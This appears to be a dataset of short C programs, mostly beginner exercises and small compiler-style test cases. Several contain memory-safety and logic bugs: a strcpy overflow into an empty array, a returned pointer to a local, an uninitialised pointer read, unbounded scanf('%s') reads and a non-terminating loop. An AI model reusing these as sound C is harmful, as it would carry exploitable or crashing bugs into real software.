    "#include <stdio.h>\n#include <string.h>\nvoid tell_if_eq(char str1[], char str2[]);\nvoid str_replace(char haystack[], char needle, char replace);\nint main()\n{\n    char teststr1[] = \"\";\n    char teststr2[] = \"string_is_13\";\n    printf(\"The test string1 is: %s\\n\", teststr1);\n    printf(\"The length of the test string1 is: %d\\n\", strlen(teststr1));\n    printf(\"The test string2 is: %s\\n\", teststr2);\n    printf(\"The length of the test string2 is: %d\\n\", strlen(teststr2));\n    tell_if_eq(teststr1, teststr2);\n    printf(\"\\nNow copy string 1 to string 2.\\n\");\n    strcpy(teststr1, teststr2);\n    printf(\"Now string 1 is: %s\\n\", teststr1);\n    printf(\"Now string 2 is: %s\\n\", teststr2);\n    tell_if_eq(teststr1, teststr2);\n    str_replace(teststr1, '_', ' ');\n    printf(\"\\nUsing strchr to replace all '_' in string 1.\\n\");\n    printf(\"Now string 1 is: %s\\n\", teststr1);\n    tell_if_eq(teststr1, teststr2);\n    printf(\"\\nThe strings are still the same length.\\n\");\n    printf(\"The length of the test string1 is: %d\\n\", strlen(teststr1));\n    printf(\"The length of the test string2 is: %d\\n\", strlen(teststr2));\n    printf(\"\\nNow let's put back the underscores.\\n\");\n    str_replace(teststr1, ' ', '_');\n    printf(\"Now string 1 is: %s\\n\", teststr1);\n    tell_if_eq(teststr1, teststr2);\n    printf(\"\\nLet's try to do the find and replace with the strpbrk function\\n\");\n    char *strptr;\n    while ((strptr = strpbrk(teststr2, \"_\")))\n    {\n        *strptr = ' ';\n    }\n    printf(\"Now string 2 is: %s\\n\", teststr2);\n    tell_if_eq(teststr1, teststr2);\n    while ((strptr = strpbrk(teststr2, \"_\")))\n    {\n        *strptr = '_';\n    }\n    printf(\"Now string 2 is: %s\\n\", teststr2);\n    tell_if_eq(teststr1, teststr2);\n    return 0;\n}\nvoid tell_if_eq(char str1[], char str2[])\n{\n    if (strcmp(str1, str2) == 0)\n    {\n        printf(\"The two strings are equal\\n\");\n    }\n    else\n    {\n        printf(\"The two strings not are equal\\n\");\n    }\n}\nvoid str_replace(char haystack[], char needle, char replace)\n{\n    char *c;\n    while ((c = strchr(haystack, needle)))\n    {\n        *c = replace;\n    }\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: %s CM\\n\", argv[0]);\n        return 1;\n    }\n    double cm = atof(argv[1]);\n    int feet = trunc(cm / 30.48);\n    double inches = trunc(fmod(cm, 30.48) / 0.254) / 10;\n    if (inches)\n        printf(\"%d'%1g\\\"\\n\", feet, inches);\n    else\n        printf(\"%d'\\n\", feet);\n}",
    "#include <stdio.h>\nint main()\n{\n  float x, y;\n  float *fp, *fp2;\n  x = 6.5;\n  printf(\"Value of x is %f, address of x %ld\\n\", x, &x);\n  fp = &x;\n  printf(\"Value in memory location fp is %f\\n\", *fp);\n  *fp = 9.2;\n  printf(\"New value of x is %f = %f \\n\", *fp, x);\n  *fp = *fp + 1.5;\n  printf(\"Final value of x is %f = %f \\n\", *fp, x);\n  y = *fp;\n  fp2 = fp;\n  printf(\"Transfered value into y = %f and fp2 = %f \\n\", y, *fp2);\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n char nome[30];\n scanf(\"%s\", nome);\n printf(\"Hello, %s\\n\", nome);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint t,n,k;\nscanf(\"%d\",&t);\nscanf(\"%d\",&n);\nscanf(\"%d\",&k);\nint ans=0;\nint i=0;\nfor ( i = 0; i < n; i++)\n{\n  if (t%k==0)\n  {\n     ans++;\n  }\n}\nprintf(\"%d\\n\",ans);\nreturn 0;\n}",
    "#include <stdio.h>\n\n\n\nint main()\n{\n    float fahr, celsius;\n    printf(\"Celsius\\tFahrenheit\\n\");\n    for(celsius = -17; celsius <= 100; celsius = celsius + 1) {\n        printf(\"%3.0f %6.1f\\n\", celsius, (celsius * 9/5) + 32);\n    }\n}",
    "#include<stdio.h>\n#include<ctype.h>\nint main(void){\n    printf(\"Input character:\");\n    char input = getchar();\n    if((0 ? isalpha(input) : (((unsigned)(input)|32)-'a') < 26)){\n        char temp = toupper(input);\n        if(input == temp)\n            putchar(tolower(input));\n        else putchar(temp);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a = 4, b = 8;\n int c = a + b;\n printf(\"c = %d\\n\", c);\n}",
    "int* test(){\n  int a;\n  int *p=&a;\n  return p;\n}\nint main(){\n  int* ptr=test();\n  *ptr;\n}",
    "#include <stdio.h>\nvoid clear_keyboard_buffer(void);\nvoid draw_line(int number);\nint main(int argc, char* argv[])\n{\n    static int number;\n    printf(\"Please enter the number of asterisks you want in your line: \");\n    scanf(\"%d\", &number);\n    clear_keyboard_buffer();\n    while (number < 1 || number > 79)\n    {\n        printf(\"I'm sorry, that number is unrecognized or out of range, try [1-79]: \");\n        scanf(\"%d\", &number);\n        clear_keyboard_buffer();\n    }\n    draw_line(number);\n    return 0;\n}\nvoid draw_line(int number)\n{\n    if (number >= 1 && number <= 79)\n    {\n        int count;\n        count = number;\n        while (count > 0)\n        {\n            printf(\"*\");\n            count --;\n        }\n        printf(\"\\n\");\n    }\n}\nvoid clear_keyboard_buffer(void)\n{\n    char c;\n    do{\n        scanf(\"%c\", &c);\n    } while (c != '\\n');\n    return;\n}",
    "void f(int value, int expect) {\n  if (value != expect) {\n  ERROR:\n    goto ERROR;\n  }\n}\nint main() {\n  int a = 4, b = 2, d = 0;\n  f(d = a && b, 0);\n  f(d = a || b, 0);\n  return 0;\n}",
    "#include <stdio.h>\nint recursive_factorial(int number);\nint main(void)\n{\n    int number, factorial;\n    printf(\"Ingrese un numero: \");\n    scanf(\"%d\", &number);\n    factorial = recursive_factorial(number);\n    printf(\"Factorial de %d = %d\\n\", number, factorial);\n    return 0;\n}\nint recursive_factorial(int number)\n{\n    if (number > 0)\n    {\n        return number * recursive_factorial(number - 1);\n    }\n    else\n    {\n        return 1;\n    }\n}",
    "#include<stdio.h>\n#include<ctype.h>\n\nvoid gline (char [], int);\ndouble atof (char []);\nint main (){\n    char s[1000];\n    gline (s, 1000);\n    printf(\"%f\", atof(s));\n    return 0;\n}\nvoid gline (char s[], int lim){\n    int i=0, c;\n    while (--lim>0 && (c=getchar())!=(-1) && c!='\\n'){\n        s[i++]=c;\n    }\n    s[i]='\\0';\n}\ndouble atof (char s[]){\n    double val, power;\n    int i, sign;\n    for (i=0; __isspace(s[i]); i++){\n        ;\n    }\n    sign=(s[i]=='-') ? -1 : 1;\n    if (s[i]=='+' || s[i]=='-'){\n        i++;\n    }\n    for (val=0.0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++){\n        val=10.0*val + (s[i]-'0');\n    }\n    if (s[i]=='.'){\n        i++;\n    }\n    for (power=1.0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++){\n        val=10.0*val + (s[i]-'0');\n        power*=10.0;\n    }\n    int sign2=1;\n    if (tolower(s[i])=='e'){\n        i++;\n        sign2=(s[i]=='-') ? -1 : 1;\n        if (s[i]=='+' || s[i]=='-'){\n            i++;\n        }\n        while(s[i]-'0'!=0){\n            if(sign2==- 1){\n                power*=10;\n            }else power/=10;\n            s[i]--;\n        }\n    }\n    return sign*val/power;\n}",
    "#include <math.h>\ndouble (*f)(double) = exp2;\nint main(){ return f != exp2; }",
    "#include <stdio.h>\nint main(){\n int casos, c=1;\n scanf(\"%d\", &casos);\n while(casos--){\n  int L, W, H;\n  scanf(\"%d %d %d\", &L, &W, &H);\n  if(L>20 || W>20 || H>20){\n   printf(\"Case %d: bad\\n\", c);\n  }\n  else{\n   printf(\"Case %d: good\\n\",c );\n  }\n  c++;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a;\n    a=5;\n   a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    a++;\n    printf(\"%d\\n\",a);\n    return 0;\n}",
    "#include <stdio.h>\nint jumpingOnClouds(int c_count, int* c) {\n    int jumps=0,i=0;\n    while(c_count>1){\n        if(c[i+1]==1){\n            jumps++;\n            c_count=c_count-2;\n            i=i+2;\n        }\n        else if(c[i+1]!=1 && c[i+2]!=1){\n            jumps++;\n            c_count=c_count-2;\n            i=i+2;\n        }\n        else{\n            jumps++;\n            c_count--;\n            i=i+1;\n        }\n    }\n    return jumps;\n}\nint main()\n{\n    int x;\n    int arr[] = {0,0,1,0,0,1,0};\n    x = jumpingOnClouds(7, arr);\n    printf(\"%d\",x);\n    return 0;\n}",
    "unsigned long a = 0xABCD;\nint main(void) {\n  if (((a & 0x0FF0) >> 4) == 0xBC) {\n    return 0;\n  } else {\n    return 1;\n  }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(){\n int mist, repeat, num, i = 1, j;\n char letter[50];\n printf(\"Type one number and one phrase\");\n scanf(\"%d\", &mist);\n while(i <= mist){\n  scanf(\"%s\", letter);\n  scanf(\"%d\", &num);\n  for(j = 0; j < strlen(letter); j++){\n   if(letter[j] < 'A' + num){\n    letter[j] = 'Z' - num + (letter[j] - 'A') + 1;\n   }else{\n    letter[j] -= num;\n   }\n  }\n  i++;\n  printf(\"%s\\n\", letter);\n }\n return 0;\n}",
    "#include <stdio.h>\n\n\ndouble set_avg(double ar[], int n);\ndouble total_avg(double ar[][5], int rows);\ndouble max(double ar[][5], int rows);\nvoid show_results(double arg);\nint main(void)\n{\n double nums[3][5];\n putchar('\\n');\n for (int r = 0; r < 3; r++)\n {\n  printf(\"SET #%d: \", r + 1);\n  for (int c = 0; c < 5; c++)\n  {\n   scanf(\"%lf\", &nums[r][c]);\n  }\n }\n putchar('\\n');\n for (int i = 0; i < 3; i++)\n {\n  printf(\"AVERAGE OF SET #%d: \", i + 1);\n  show_results(set_avg(&nums[i][0], 5));\n }\n putchar('\\n');\n printf(\"TOTAL AVERAGE: \");\n show_results(total_avg(nums, 3));\n putchar('\\n');\n printf(\"LARGEST NUMBER: \");\n show_results(max(nums, 3));\n putchar('\\n');\n return 0;\n}\ndouble set_avg(double ar[0], int n)\n{\n double subtot = 0;\n double total = 0;\n for (int i = 0; i < n; i++)\n {\n  subtot += ar[i];\n }\n total = subtot / n;\n return total;\n}\ndouble total_avg(double ar[][5], int rows)\n{\n double subtot = 0;\n double total = 0;\n for (int r = 0; r < rows; r++)\n {\n  for (int c = 0; c < 5; c++)\n  {\n   subtot += ar[r][c];\n  }\n }\n total = subtot / (3 * 5);\n return total;\n}\ndouble max(double ar[][5], int rows)\n{\n int max = ar[0][0];\n for (int r = 0; r < rows; r++)\n {\n  for (int c = 1; c < 5; c++)\n  {\n   if (max - ar[r][c] < 0)\n   {\n    max = ar[r][c];\n   }\n  }\n }\n return max;\n}\nvoid show_results(double arg)\n{\n printf(\"%.2f\\n\", arg);\n}",
    "#include <stdio.h>\nvoid selection(long a[], int n)\n{\n  int i,j,temp;\n  for(i=0;i<n;i++)\n  {\n      for(j=i+1;j<n;j++)\n      {\n          if(a[i]>a[j])\n          {\n              temp=a[i];\n              a[i]=a[j];\n              a[j]=temp;\n          }\n      }\n  }\n}\nint main(void) {\n int n,i,t,k;\n scanf(\"%d\",&t);\n for(k=0;k<t;k++)\n {\n scanf(\"%d\",&n);\n long a[n];\n for(i=0;i<n;i++)\n    scanf(\"%ld\",&a[i]);\n selection(a,n);\n for(i=0;i<n;i++)\n    printf(\"%ld\\t\",a[i]);\n printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n#include <string.h>\nint strrcmp(char *s, char *t);\nint print_characters(int (*character_converter)(int));\nint main(int argc, char *argv[]) {\n if (argc > 1) {\n  printf(\"usage: %s [<input_file]\\n\", argv[0]);\n  return -1;\n }\n else if (strrcmp(argv[0], \"lower\") == 0) {\n  print_characters(tolower);\n  return 0;\n }\n else if (strrcmp(argv[0], \"upper\") == 0) {\n  print_characters(toupper);\n  return 0;\n }\n return -1;\n}\nint strrcmp(char *s, char *t) {\n size_t i = strlen(s) - 1;\n size_t j = strlen(t) - 1;\n while (s[i] == t[j] && i != 0 && j != 0) {\n  i--;\n  j--;\n }\n if (s[i] == t[j] && j == 0) {\n  return 0;\n }\n return 1;\n}\nint print_characters(int (*character_converter)(int)) {\n int c;\n while ((c = getchar()) != (-1)) {\n  putchar((*character_converter)(c));\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n    FILE *fp;\n    char *pch;\n    char buff[100];\n    unsigned long i = 0;\n    fp = fopen(\"nurbs/1509077_Samsonite.nurbs\", \"r\");\n    if (fp == ((void*)0)) perror(\"Error opening file.\");\n    else {\n        while ( fgets(buff, 100, fp) != ((void*)0) ) {\n            pch = strtok (buff,\" :\\n\");\n            if ( strncmp(\"SPLINE\", pch,10) == 0 ) {\n                printf(\"SPLINE\\n\");\n            } else if ( strncmp(\"n_ctrlp\", pch,10) == 0 ) {\n                pch = strtok (((void*)0), \" :\\n\");\n                int n_ctrlp;\n                sscanf(pch, \"%d\", &n_ctrlp);\n                printf(\"n_ctrlp: %d\\n\", n_ctrlp);\n            } else if ( strncmp(\"ctrlp\", pch,10) == 0 ) {\n                pch = strtok (((void*)0), \" :\\n\");\n                int i;\n                float ctrlp[3];\n                for (i=0; i<3 && pch!=((void*)0); i++) {\n                    sscanf(pch, \"%f\", ctrlp+i);\n                    pch = strtok (((void*)0), \" :\\n\");\n                }\n                printf (\"ctrlp: %f %f %f\\n\", ctrlp[0], ctrlp[1], ctrlp[2]);\n            } else if ( strncmp(\"knot\", pch,10) == 0 ) {\n                pch = strtok (((void*)0), \" :\\n\");\n                float knot;\n                sscanf(pch, \"%f\", &knot);\n                printf(\"knot: %f\\n\", knot);\n            } else if ( strncmp(\"u_min\", pch,10) == 0 ) {\n                pch = strtok (((void*)0), \" :\\n\");\n                float u_min;\n                sscanf(pch, \"%f\", &u_min);\n                printf(\"u_min: %f\\n\", u_min);\n            } else if ( strncmp(\"u_max\", pch,10) == 0 ) {\n                pch = strtok (((void*)0), \" :\\n\");\n                float u_max;\n                sscanf(pch, \"%f\", &u_max);\n                printf(\"u_max: %f\\n\", u_max);\n            } else {\n                printf(\"Parsing error: %s\\n\", pch);\n            }\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i;\n   int N = 11;\n   double A[N][N];\n   for(i = 0; i < N-1; i++) {\n     A[0][i] = 1.0;\n     A[i+1][10] = 1.0;\n     A[10][0] = 1.0;\n   }\n   for (int i=0; i<N; i++)\n     for (int j=0; j<N; j++)\n       printf(\"%f\\n\", A[i][j]);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Hello World\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\n\ntypedef _Bool bool;\ntypedef void (*sort_fn)(int *arr, int len);\nstatic void print_arr(int *arr, int len) {\n    for (int i = 0; i < len; i++) {\n        printf(\"%d \", arr[i]);\n    }\n    putchar('\\n');\n}\nstatic int merge_arrays(int *dest_arr, int dest_cap, int *arr1, int len1, int *arr2, int len2) {\n    int dest_pos = 0;\n    int i1 = 0;\n    int i2 = 0;\n    while (i1 < len1 && i2 < len2) {\n        int val1 = arr1[i1];\n        int val2 = arr2[i2];\n        if (val1 < val2) {\n            dest_arr[dest_pos++] = val1;\n            i1++;\n        } else if (val1 > val2) {\n            dest_arr[dest_pos++] = val2;\n            i2++;\n        } else {\n            dest_arr[dest_pos++] = val1;\n            i1++;\n            i2++;\n        }\n    }\n    while (i1 < len1) {\n        dest_arr[dest_pos++] = arr1[i1];\n        i1++;\n    }\n    while (i2 < len2) {\n        dest_arr[dest_pos++] = arr2[i2];\n        i2++;\n    }\n    return dest_pos;\n}\nint main(void) {\n    int arr1[] = {1, 12, 15, 22, 30, 38, 42, 50, 60, 70, 80, 90, 100};\n    int arr2[] = {2, 4, 8, 10, 12, 14, 16};\n    int len1 = sizeof(arr1) / sizeof(*arr1);\n    int len2 = sizeof(arr2) / sizeof(*arr2);\n    printf(\"A: \");\n    print_arr(arr1, len1);\n    printf(\"B: \");\n    print_arr(arr2, len2);\n    putchar('\\n');\n    int *arr_merged = malloc(sizeof(*arr_merged) * (len1 + len2));\n    int len_merged = merge_arrays(arr_merged, len1 + len2, arr1, len1, arr2, len2);\n    printf(\"Merged: \");\n    print_arr(arr_merged, len_merged);\n    return 0;\n}",
    "#include<stdio.h>\n\nint main(){\n int i,j;\n float X[5],\n       Y[5],\n       Xin=0.0f,poly=0,temp=1;\n printf(\"Enter the (x,y) values:\\n\");\n for(i=0;i<5;++i)\n {\n  printf(\"Enter (X%d,Y%d): \",i,i);\n  scanf(\"%f %f\",&X[i],&Y[i]);\n  putchar('\\n');\n }\n printf(\"Enter the value to interpolate: \");\n scanf(\"%f\",&Xin);\n for(i=0;i<5;++i)\n {\n  temp=1;\n  for(j=0;j<5;++j)\n  {\n   if(i!=j)\n   {\n    temp=temp*(Xin-X[j]);\n    temp=temp/((X[i]-X[j]));\n   }\n        }\n        temp=temp*Y[i];\n        poly=poly+temp;\n }\n printf(\"Interpolated value corresponding %f = %f\\n\",Xin,poly);\n return 0;\n}",
    "#include<stdio.h>\nint main() {\n    int i, j, n = 7;\n    for(i = n; i > 0; i--) {\n        for(j = i; j > 0; j--) {\n           printf(\"* \");\n        }\n        printf(\"\\n\");\n    }\n    for(i = 2; i <= n; i++) {\n        for(j = 1; j <= i; j++) {\n           printf(\"* \");\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nvoid initq(int *f,int *r)\n{\n *f=0;\n *r=0;\n}\nint emptyq(int f ,int r)\n{\n if (f==r)\n  return 1;\n else return 0;\n}\nint fullq(int f, int r)\n{\n if((r+1)%10==f)\n  return 1;\n else return 0;\n}\nvoid enterq(int *x,int *r,int p)\n{\n x[*r]=p;\n *r=(*r+1)%10;\n}\nvoid deleteq(int *x,int *f,int *p)\n{\n *p=x[*f];\n *f=(*f+1)%10;\n}\nint main()\n{\n int x[10],f,r,p,choice;\n initq(&f,&r);\n printf(\"The opertions on the queue are\\n\");\n do\n {\n  printf(\"1.enterq\\n2.deleteq\\n3.exit\\n\");\n  printf(\"enter your choice\\n\");\n  scanf(\"%d\",&choice);\n  switch(choice)\n  {\n   case 1:\n   if(!fullq(f,r))\n   {\n    printf(\"\\nEnter a number to enter into queue\\n\");\n    scanf(\"%d\",&p);\n    enterq(x,&r,p);\n   }\n   else\n    printf(\"\\nQueue is full\\n\\n\");\n   break;\n   case 2:\n   if(!emptyq(f,r))\n   {\n    deleteq(x,&f,&p);\n    printf(\"\\n%d is deleted\\n\\n\",p );\n   }\n   else\n    printf(\"\\nqueue is empty!\\n\\n\");\n   break;\n   case 3:\n   printf(\"\\n\");\n   break;\n   default:\n   printf(\"\\nInvalid choice entered!\\n\");\n  }\n }while(choice!=3);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main (int argc, char* argv[]) {\n if (argc != 4) {\n  printf(\"Usage is: <start number> <end number> <output file path>\\n\");\n  return 1;\n }\n int start = atoi(argv[1]);\n int end = atoi(argv[2]);\n FILE *outputStream;\n outputStream = fopen(argv[3], \"w\");\n for (int i = start; i <= end; i++) {\n  fprintf(outputStream, \"%d\\n\", i);\n }\n fclose(outputStream);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n const double IN_PER_FT = 12.0;\n const double CM_PER_IN = 2.54;\n const double CM_PER_FT = 30.48;\n double height = 0.0;\n double in;\n int ft;\n printf(\"Enter a height in centimeters:\");\n scanf(\"%lf\", &height);\n while (height > 0.0)\n {\n  in = height / CM_PER_IN;\n  ft = in / IN_PER_FT;\n  printf(\"%.1f cm = %d feet, %.1f inches.\\n\",\n      height, ft, in - (double)ft * IN_PER_FT);\n  printf(\"Enter a height in centimeters (<=0 to quit):\");\n  scanf(\"%lf\", &height);\n }\n printf(\"bye\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n  printf(\"Hello world\\n\");\n  char c = 'p';\n  char s[] = \"paul\";\n  printf(\"c=%c and s=%s\\n\", c, s);\n  printf(\"s is %ld elements long\\n\", sizeof(s));\n  return 0;\n}",
    "\n\nint war_1;\nint main(void) {\n int tmp;\n  while (1) {\n    tmp = war_1;\n    war_1 = 1;\n  }\n}",
    "#include<stdio.h>\nint main() {\n    while(1){\n char buff[1024];\n scanf(\"%s\",buff);\n printf(\"%s HELLO \\n\",buff);\n}\n}",
    "#include <stdio.h>\nint main(void) {\n    printf(\"Is a > b? Answer: %d\\n\", 'a'>'b');\n    printf(\"Is z > n? Answer: %d\\n\", 'z'>'n');\n    return 0;\n}",
    "#include <stdio.h>\nint func(int a)\n{\n  switch (a)\n  {\n  case 1: return a;\n  case 2: return a+1;\n  case 3: return a*2;\n  case 4: return a+3;\n  case 5: return a-4;\n  case 6: return a+1;\n  case 7: return a-5;\n  case 8: return a+7;\n  }\n  return -1;\n}\nint main()\n{\n  int a;\n  scanf(\"%d\", &a);\n  return func(a);\n}",
    "#include <string.h>\nint strcmp(const char *, const char *);\nint main(void){\n return strcmp(\"hello\", \"hi\");\n}",
    "#include <stdio.h>\nint main() {\n  int *foo;\n  printf(\"%d\\n\", foo[0]);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nchar *func_m(char *str);\nchar *func_s(char *str);\nchar str1[20]=\"HELLO WORLD!!!\";\nchar str2[20]=\"HELLO !!!\";\nint main(){\nchar *pm=func_s(str1);\nprintf(\"%s\\n\",pm);\nchar *ps=func_s(str2);\nprintf(\"%s\\n\",ps);\nreturn 0;\n}\nchar *func_m(char *str){\nchar *p=(char *)malloc(20);\nmemset(p,0,20);\nstrcpy(p,str);\nreturn p;\n}\nchar* func_s(char *str){\nstatic char var[20];\nmemset(var,0,20);\nstrcpy(var,str);\nreturn var;\n}",
    "#include<stdio.h>\n#include<pthread.h>\npthread_mutex_t sum_mutex = {{{0}}};\nlong long sum=0;\nvoid* func(void* ptr)\n{\n for(int i=0;i<10000;++i)\n    {\n        pthread_mutex_lock(&sum_mutex);\n  sum=sum+1;\n        pthread_mutex_unlock(&sum_mutex);\n    }\n}\nint main()\n{\n pthread_t t1[10];\n for(int i=0;i<10;++i)\n  pthread_create(&t1[i], ((void*)0), func, ((void*)0));\n for(int i=0;i<10;++i)\n  pthread_join(t1[i], ((void*)0));\n    pthread_mutex_destroy(&sum_mutex);\n printf(\"%Ld\",sum);\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n void jolly();\n void deny();\n for (int i = 0; i < 3; i ++) {\n  jolly();\n }\n deny();\n}\nvoid jolly(){\n printf(\"For he's a jooly good fellow!\\n\");\n}\nvoid deny(){\n printf(\"Which nobody deny!\\n\");\n}",
    "#include<stdio.h>\n#include<string.h>\nvoid getData(char *buff);\nint main()\n{\n FILE *fp = fopen(\"stock.csv\",\"r\");\n    int count=0;\n do\n {\n  char buff[1024];\n  fgets(buff, 1024, (FILE*)fp);\n  count++;\n  if(count != 1)\n  {\n    printf(\"%s\", buff);\n   getData(buff);\n  }\n  getchar();\n } while((getc(fp))!=(-1));\n}\nvoid getData(char buff[])\n{\n   char *token = strtok(buff,\",\");\n   int counter=0;\n   while( token != ((void*)0) )\n   {\n      counter++;\n      printf( \" %s\\n\",token);\n      token = strtok(((void*)0),\",\");\n   }\n}",
    "#include <stdio.h>\nint main() {\n  int a;\n  double pi = 3.14;\n  a = (int)pi;\n  printf(\"%d\\n\", a);\n  return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n int i,j;\n float x;\n printf(\"Enter input (for i, x and j) as 10.3 5 6: \");\n scanf(\"%d%f%d\",&i,&x,&j);\n printf(\"i=%d\\nx=%.2f\\nj=%d\",i,x,j);\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    float a, b;\n    while (scanf(\"%f %f\", &a, &b) != (-1)) {\n        printf(\"%.3f km/l\\n\", a / b);\n    }\n}",
    "#include<stdio.h>\nint main()\n{\n    int Size, i, a[10];\n    int Even_Sum = 0, Odd_Sum = 0;\n    printf(\"\\n Please Enter the Size of an Array : \");\n    scanf(\"%d\", &Size);\n    printf(\"\\nPlease Enter the Array Elements\\n\");\n    for(i = 0; i < Size; i++)\n    {\n        scanf(\"%d\", &a[i]);\n    }\n    for(i = 0; i < Size; i ++)\n    {\n        if(a[i] % 2 == 0)\n        {\n            Even_Sum = Even_Sum + a[i];\n        }\n        else\n        {\n            Odd_Sum = Odd_Sum + a[i];\n        }\n    }\n    printf(\"\\n The Sum of Even Numbers in this Array = %d \", Even_Sum);\n    printf(\"\\n The Sum of Odd Numbers in this Array = %d \", Odd_Sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int i,n;\n    for (i=1; ; i++) {\n        scanf(\"%d\",&n);\n        if (n==0) break;\n        printf(\"Case %d: %d\\n\",i,n);\n    }\n    return 0;\n}",
    "char oam_off;\n#pragma bss-name (push,\"ZEROPAGE\")\nchar oam_off;\n#pragma bss-name (pop)\nint main(void)\n{\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned short c,n;\n    scanf(\"%hd\", &c);\n    while (c--) {\n        scanf(\"%hd\", &n);\n        if (n % 2)\n            printf(\"1\\n\");\n        else\n            printf(\"0\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  int lumens, watts;\n  printf(\"Type lumens => \");\n  scanf(\"%d\", &watts);\n  switch(watts) {\n    case 15:\n      lumens = 125;\n      break;\n    case 25:\n      lumens = 215;\n      break;\n    case 45:\n      lumens = 500;\n      break;\n    case 60:\n      lumens = 880;\n      break;\n    case 75:\n      lumens = 1000;\n      break;\n    case 100:\n      lumens = 1675;\n      break;\n    default:\n      lumens = -1;\n  }\n  printf(\"Lumens: %d\\n\", lumens);\n}",
    "#include <stdio.h>\nvoid swap(int,int);\nint main()\n{\n    int x,y;\n    printf(\"Enter first number:\");\n    scanf(\"%d\",&x);\n    printf(\"Enter Second number :\");\n    scanf(\"%d\",&y);\n    printf(\"Outside Swap function\\n Before swap first number:%d\\n Before swap second number:%d\\n\",x,y);\n    swap(x,y);\n    return 0;\n}\nvoid swap(int num1,int num2){\n    int temp=0;\n    temp= num1;\n    num1= num2;\n    num2= temp;\n     printf(\"Inside Swap function\\n After swap first number:%d\\n After swap second number:%d\",num1,num2);\n}",
    "#include <stdio.h>\nint main()\n{\nint duplicates[100];\n}",
    "#include<stdio.h>\nvoid F(int *, int *);\nint main()\n{\n int x, y;\n x=100, y=200;\n printf(\"\\nBefore Calling F()\");\n printf(\"\\nInside main() x = %d \\ty = %d\", x, y);\n F(&x, &y);\n printf(\"\\nAfter  Calling F()\");\n printf(\"\\nInside main() x = %d \\ty = %d\", x, y);\n}\nvoid F(int *a, int *b)\n{\n*a = 200;\n*b = 400;\nprintf(\"\\nInside F()     x = %d  \\ty = %d\", *a, *b);\n}",
    "#include <stdio.h>\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    if(n % 5 == 0 && n % 7 == 0)\n    {\n        printf(\"True.\\n\");\n    }\n    else\n    {\n        printf(\"False.\\n\");\n    }\n    return 0;\n}",
    "void exit(int status);\nvoid abort(void);\nint a = 1, b;\nint g () { return 0; }\nvoid h (x) int x; {}\nint f ()\n{\n  if (g () == -1)\n    return 0;\n  a = g ();\n  if (b >= 1)\n    h (a);\n  return 0;\n}\nint main ()\n{\n  f ();\n  if (a != 0)\n    abort ();\n  exit (0);\n}",
    "#include <stdio.h>\nvoid print_number_factors(int x)\n{\n    printf(\"Number factors: \");\n    int divisor = 2;\n    while (x != 1)\n    {\n        while (x%divisor == 0)\n        {\n            printf(\"%d \", divisor);\n            x /= divisor;\n        }\n        divisor += 1;\n    }\n    printf(\"\\n\");\n}\nint main(int argc, char* argv[])\n{\n    int x;\n    printf(\"Enter number to factorize:\");\n    scanf(\"%d\", &x);\n    print_number_factors(x);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char* argv[]) {\n    for (int i = argc - 1; i >= 1; --i) {\n        printf(\"%s \", argv[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "int main() {\n    int a = 0, b = 1, c = 2, d = 3;\n    a = ((b*c*d) && (a*d)) + (((c+b)/d) || a) + b*c;\n    return a;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <string.h>\nint main(){\n    char a[100]=\"000\\0\", b[100]=\"123456789\\0\";\n    strcpy(b,a);\n    printf(\"%s\\n\",b);\n    return 0;\n}",
